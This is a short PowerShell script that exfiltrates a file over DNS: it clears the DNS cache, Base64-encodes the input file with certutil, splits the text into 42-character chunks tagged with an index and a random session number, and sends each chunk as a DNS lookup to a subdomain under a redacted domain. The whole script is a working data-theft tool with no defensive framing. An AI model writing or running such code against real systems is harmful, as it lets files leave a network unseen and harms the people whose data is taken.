param(
    [string]$InputFile
)

Clear-DnsClientCache

$chunkSize = 42
$randNumber = (Get-Random -Minimum 0 -Maximum 1000).ToString("D4")

Write-Host "Converting file to Base64..."

$base64tmpfile = "$env:TEMP/encoded.b64"

if (Test-Path $base64tmpfile) {
    Remove-Item -Path $base64tmpfile -Force
}

# Encode the input file using certutil's Base64 format.
certutil -encode "$InputFile" "$base64tmpfile"

$contents = Get-Content -Path $base64tmpfile -Raw

# Remove certutil's headers and whitespace, then convert to URL-safe Base64.
$base64 = $contents -replace '-----BEGIN CERTIFICATE-----', '' `
    -replace '-----END CERTIFICATE-----', '' `
    -replace "(`r`n|`n|`r| )", ''

$base64safe = $base64 -replace '\+', '-' -replace '/', '_' -replace '=', ''

Write-Host $base64safe
Write-Host "Base64 string splitting..."

$chunks = @()

# Split the encoded data into fixed-size chunks and attach metadata.
for ($i = 0; $i -lt $base64safe.Length; $i += $chunkSize) {
    $index = [int]($i / $ChunkSize)
    $remaining = $base64safe.Length - $i
    $length = if ($remaining -lt $chunkSize) { $remaining } else { $chunkSize }
    $part = $base64safe.substring($i, $length)
    $chunk = "${part}.${index}.${randNumber}.REDACTED"
    $chunks += $chunk
}

foreach ($chunk in $chunks) {
    Write-Host "Sending $chunk"
    $dnsResponse = Resolve-DnsName -Name $chunk -Type A
}
